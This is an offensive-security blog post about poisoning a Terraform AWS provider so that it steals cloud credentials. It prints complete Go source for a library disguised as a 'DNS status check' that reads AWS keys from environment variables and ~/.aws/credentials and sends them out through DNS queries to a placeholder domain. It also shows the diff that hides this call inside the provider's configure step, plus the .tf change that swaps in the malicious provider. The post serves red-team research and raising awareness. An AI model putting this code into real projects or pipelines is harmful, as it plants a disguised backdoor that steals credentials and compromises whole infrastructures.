---
title:  "The Stealthy Terraform Trap: From Innocuous Line to Infrastructure Domination"
date:   2024-02-16 00:00:00 -0000
excerpt: "How a single line of code can compromise an entire enterprise"
categories: 
- research
- infrastructure
tags: 
- "Offensive Security"
authors: 
- vdgonc
- thau0x01
layout: single
classes:
- wide
header: 
  teaser: /assets/images/posts/teaser-the-stealthy-terraform-trap.webp
  og_image: /assets/images/posts/the-stealthy-terraform-trap-og.webp

---

![The Stealthy Terraform Trap: From Innocuous Line to Infrastructure Domination](/assets/images/posts/the-stealthy-terraform-trap-cover.webp){: .align-center}

**In our latest exploration, we unveil how a seemingly innocuous line of Terraform code can serve as a covert conduit for attackers to infiltrate and dominate entire infrastructures.** The crux of this strategy's success lies in its discretion—by merely tweaking a single line in a strategic location, an attacker can embed a backdoor that eludes conventional security systems. This revelation delivers a crucial cybersecurity insight: the most formidable threats are often hidden in plain sight, arising from the least suspected quarters.

A cornerstone of our research is the demonstration of <span class="underlined">how a minor change in a Terraform configuration can precipitate a comprehensive breach</span>. The diff below showcases the exact modification an attacker might make to compromise the infrastructure of an entire enterprise:

```diff
 terraform {
   required_providers {
     aws = {
-      source = "hashicorp/aws"
+      source = "RatCorpInc/aws"
       version = "4.30.7"
     }
   }
```

**This nuanced yet profound change** underscores the tightrope walk between harnessing Infrastructure as Code (IaC) for operational efficiency and navigating its associated perils, accentuating the indispensable need for heightened alertness amidst ever-shifting cyber threats.

This project is a culmination of rigorous research by the Pirate Ship team, aimed at presentation during the [NullByte Security Conference 2022](https://www.nullbyte-con.org/){:target="_blank"} held in November 2022 in Salvador, Bahia, Brazil.
{: .notice}

## Motivations

Our research was driven by the challenge of how a red team could efficiently compromise a broad array of assets with minimal effort and footprint. In our quest to identify the most impactful vulnerability within a company's infrastructure, Infrastructure as Code (IaC) pipelines emerged as a critical focal point. This revelation set the stage for our investigation, guiding us toward understanding and exploiting the subtle yet significant weaknesses inherent in these systems.

## Understanding Terraform and Its Providers

Terraform, developed by HashiCorp, is a tool for building, changing, and managing infrastructure efficiently. It uses a few key commands and concepts that make infrastructure management both powerful and user-friendly.

- **`init`:** This command starts any Terraform project. It prepares your working directory for other commands by <span class="underlined">installing any necessary providers</span>. Providers are plugins Terraform uses to interact with cloud services, like AWS or Google Cloud, making sure Terraform has everything it needs to manage your infrastructure.

- **`validate`:** Before applying changes, Terraform allows you to validate your configuration files to ensure they are syntactically correct and internally consistent.

- **`plan`:** Terraform compares your desired infrastructure (defined in your configuration files) with your actual infrastructure and shows what changes it will make without applying them. This preview helps in understanding what Terraform will do before making any changes.

- **`apply`:** This command is where the magic happens. Terraform takes the plan you reviewed and changes the infrastructure to match your configuration files. It's the command that creates, updates, or deletes your infrastructure resources based on your configurations.

- **`destroy`:** When you no longer need your infrastructure, Terraform can clean up everything it created, removing all resources defined in your configurations.

**Modules and Providers:**

- **Modules:** These are containers for multiple resources that are used together. A module can include resources from different providers, making it a reusable block of configurations you can use across projects or share with others.

- **Providers:** These are plugins Terraform uses to understand and interact with cloud providers' APIs. Each provider offers a set of resources and data sources that Terraform can manage.

In essence, Terraform uses a declarative configuration language to describe your desired infrastructure, making it possible to create an exact blueprint of your environment. This approach simplifies infrastructure management, automation, and collaboration.

## Strategy, from the Greek stratēgia.

Our approach to infiltrating an IaC pipeline hinges on the concept of <span class="underlined">"poisoning" a Terraform provider with malicious code</span>. Crucially, this code must operate stealthily, without altering the provider's expected functions. This method ensures that the teams managing the compromised pipeline remain unaware of any breach. This strategy aligns with our goals of maximizing impact while minimizing effort and detectability, drawing inspiration from the ancient Greek concept of stratēgia, where careful planning ensures victory with minimal conflict.

## Crafting an evil AWS Provider

Utilizing a malicious Terraform provider opens a wide array of attack vectors, all dependent on the ingenuity of the attacker. Our case study demonstrates the stealthy exfiltration of AWS Credentials by exploiting the AWS Terraform provider.

The process commenced with the cloning of the official AWS provider repository from GitHub:

```bash
git clone "https://github.com/hashicorp/terraform-provider-aws.git"
```

With the repository at our disposal, we delved into its structure to identify the optimal insertion point for our malicious payload. Our scrutiny focused on segments within `internal/provider/provider.go`, a file pivotal for executing the provider's configuration for AWS interactions.

To facilitate our objective, we utilized a specialized external library crafted to clandestinely capture and exfiltrate credentials. This library employs DNS exfiltration, a technique selected for its proven efficacy, especially in networks with stringent outbound communication controls.

The following code snippet highlights this library's source code.

```golang
package awsdnsstatuscheck

import (
	"fmt"
	"os"
	"strconv"
	"strings"
	"github.com/CS-5/exfil2dns"
	"github.com/miekg/dns"
)

type TypeCred int32

const (
	Undefined TypeCred = iota
	ACCESSKEY
	SECRETKET
	SECURETOKEN
)

func (t TypeCred) String() string {
	return [...]string{"Undefined", "accesskey", "secretkey", "securetoken"}[t]
}

const (
	HASH             = "YOUR_VERY_SECRET_KEY"
	DNS              = "yourdomain.com"
	ENV_ACESS_KEY    = "AWS_ACCESS_KEY_ID"
	ENV_SECRET_KEY   = "AWS_SECRET_ACCESS_KEY"
	ENV_SECURE_TOKEN = "AWS_SESSION_TOKEN"
)

func VerifyDNSStatus() bool {
	sendData(getAccessKey(), 1)
	sendData(getSecretKey(), 2)
	token := getSessionToken()
	if token != "" {
		sendData(token, 3)
	}

	return true
}

func encode(payload string, t TypeCred, part int) string {

	var target string
	var chunksize int = 23
	var client exfil2dns.Client

	switch t {
	case ACCESSKEY:
		target = "accesskey"
	case SECRETKET:
		target = "secretkey-" + strconv.Itoa(part)
	case SECURETOKEN:
		target = "securetoken-" + strconv.Itoa(part)
	default:
		target = ""
	}
	client, err := exfil2dns.NewClient(
		target,
		DNS,
		HASH,
		chunksize,
	)
	if err != nil {
		fmt.Printf("error on create client, got: %s", err.Error())
		return ""
	}

	q, err := client.Encode([]byte(payload))
	if err != nil {
		fmt.Printf("error on encode data, got: %s", err.Error())
	}
	return q
}

func sendData(payload string, t TypeCred) {
	var (
		msg    dns.Msg
		client dns.Client
	)

	pslice := splitRecursive(payload, 23)

	for i, p := range pslice {
		domain := encode(p, t, i)
		msg.SetQuestion(domain, dns.TypeA)
		_, _, err := client.Exchange(&msg, "ns7."+DNS+":53")
		if err != nil {
			fmt.Printf("failed exchange, %s", err.Error())
		}
	}

}

func splitRecursive(str string, size int) []string {
	if len(str) <= size {
		return []string{str}
	}
	return append([]string{string(str[0:size])}, splitRecursive(str[size:], size)...)
}

func openSharedFile() []string {
	home, _ := os.UserHomeDir()
	filename := home + "/.aws/credentials"

	dat, _ := os.ReadFile(filename)

	d := string(dat)
	d = strings.Trim(d, "[default]")
	dd := strings.Split(d, "\n")

	return dd
}

func getAccessKey() string {
	aws_access_key_id := os.Getenv(ENV_ACESS_KEY)

	if aws_access_key_id != "" {
		return aws_access_key_id
	}

	dat := openSharedFile()

	for _, line := range dat {
		splited := strings.Split(line, "=")
		if len(splited) == 2 && splited[0] == "aws_access_key_id " {
			return splited[1]
		}
	}
	return ""
}

func getSecretKey() string {
	aws_secret_access_key := os.Getenv(ENV_SECRET_KEY)
	if aws_secret_access_key != "" {
		return aws_secret_access_key
	}

	dat := openSharedFile()

	for _, line := range dat {
		splited := strings.Split(line, "=")
		if len(splited) == 2 && splited[0] == "aws_secret_access_key " {
			return splited[1]
		}
	}
	return ""
}

func getSessionToken() string {
	aws_session_token := os.Getenv(ENV_SECURE_TOKEN)
	if aws_session_token != "" {
		return aws_session_token
	}
	return ""
}
```

This library, when integrated into our modified provider, reads AWS Credentials from environment variables or the default credentials file (`~/.aws/credentials`), then encodes and sends this data to our control server using DNS queries.

To maintain ethical boundaries, this post will not detail the command-and-control (C2) DNS server setup used to capture credentials. Our aim is to prevent facilitating malicious activities by those without authorization. We encourage responsible disclosure and the use of knowledge for defensive purposes only.
{: .notice--warning}

Following this principle, we integrated our crafted functionality by modifying `internal/provider/provider.go`. This update imports our designed library just after the config, activating it across all Terraform operations to demonstrate the potential for silent data exfiltration without providing a blueprint for misuse.

```diff
diff --git a/internal/provider/provider.go b/internal/provider/provider.go
index ea71174..124c4a9 100644
--- a/internal/provider/provider.go
+++ b/internal/provider/provider.go
@@ -8,5 +8,7 @@ import (
        "regexp"
        "time"
+       // import of our malicious library 
+       awsdnsstatuscheck "github.com/RatCorpInc/aws-dns-status-check"
        "github.com/aws/aws-sdk-go-v2/feature/ec2/imds"
        awsbase "github.com/hashicorp/aws-sdk-go-base/v2"
        "github.com/hashicorp/terraform-plugin-sdk/v2/diag"
@@ -2205,5 +2206,7 @@ func configure(ctx context.Context, provider *schema.Provider, d *schema.Resourc
                UseDualStackEndpoint:           d.Get("use_dualstack_endpoint").(bool),
                UseFIPSEndpoint:                d.Get("use_fips_endpoint").(bool),
        }
+       // invocation of our malicious library
+       awsdnsstatuscheck.VerifyDNSStatus()
        if v, ok := d.GetOk("allowed_account_ids"); ok && v.(*schema.Set).Len() > 0 {
                config.AllowedAccountIds = flex.ExpandStringValueSet(v.(*schema.Set))
        }
```

With our custom malicious provider developed and the necessary library integrated, the deployment process begins. This involves registering an organization within the Terraform registry and then proceeding to build and publish the provider. This step incorporates your malicious code directly into the provider's executable, embedding it within the tool's functionality.

The subsequent phase requires setting up the command-and-control (C2) DNS server. This infrastructure will receive the data exfiltrated through the use of the malicious provider. Additionally, it's crucial to modify Terraform configuration files `.tf` within your controlled environments to point to your crafted provider, effectively replacing the legitimate one. Here's how you can adjust the `.tf` files:

```terraform
terraform {
   required_providers {
     aws = {
       source = "YOUR_ORG/aws" // Specify your organization's modified provider
       version = "4.30.7" // Ensure compatibility with the expected provider version
     }
   }
```

This step is pivotal in rerouting the normal operation to utilize your modified provider, demonstrating the proof of concept in a controlled, ethical manner. It's important to remember that such modifications should only be performed within authorized environments to avoid unethical use or harm.

The source code repositories of all code related to this post is in the following section.

## References

- [Terraform providers Documentation](https://developer.hashicorp.com/terraform/registry/providers/docs){:target="_blank"}
- [Poisoned Terraform AWS Provider](https://github.com/RatCorpInc/terraform-provider-aws){:target="_blank"}
- [Malicious Library incorporated into the provider](https://github.com/RatCorpInc/aws-dns-status-check){:target="_blank"}
- [Example compromised Terraform project](https://github.com/RatCorpInc/terraform-module-eks-with-bastion){:target="_blank"}